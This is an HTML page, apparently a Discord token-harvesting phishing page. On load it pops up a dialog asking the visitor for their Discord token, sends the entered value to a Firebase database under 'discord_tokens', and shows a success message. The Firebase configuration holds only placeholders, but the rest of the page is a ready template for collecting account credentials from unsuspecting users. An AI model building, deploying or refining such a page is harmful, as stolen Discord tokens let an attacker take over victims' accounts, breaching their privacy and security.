<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Token Prompt</title>
  <!-- Include SweetAlert2 -->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.1.2/firebase-database.js"></script>
  <script>
    // Your web app's Firebase configuration
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_AUTH_DOMAIN",
      databaseURL: "YOUR_DATABASE_URL",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_STORAGE_BUCKET",
      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
      appId: "YOUR_APP_ID",
      measurementId: "YOUR_MEASUREMENT_ID"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Function to prompt for Discord token using SweetAlert2
    function promptForToken() {
      Swal.fire({
        title: 'Enter your Discord token',
        input: 'text',
        inputAttributes: {
          autocapitalize: 'off'
        },
        showCancelButton: true,
        confirmButtonText: 'Submit',
        showLoaderOnConfirm: true,
        preConfirm: (token) => {
          // Save token to Firebase
          return saveTokenToFirebase(token);
        },
        allowOutsideClick: () => !Swal.isLoading()
      }).then((result) => {
        if (result.isConfirmed) {
          Swal.fire({
            title: 'Token Submitted!',
            icon: 'success'
          });
        }
      });
    }

    // Function to save token to Firebase
    function saveTokenToFirebase(token) {
      const tokensRef = database.ref('discord_tokens');
      tokensRef.push({
        token: token
      }).then(() => {
        console.log("Token saved successfully!");
      }).catch((error) => {
        console.error("Error saving token:", error);
      });
    }

    // Call the function to prompt for token when page loads
    window.onload = function() {
      promptForToken();
    };
  </script>
</head>
<body>
  <h1>Welcome to the Discord Token Prompt Website</h1>
</body>
</html>
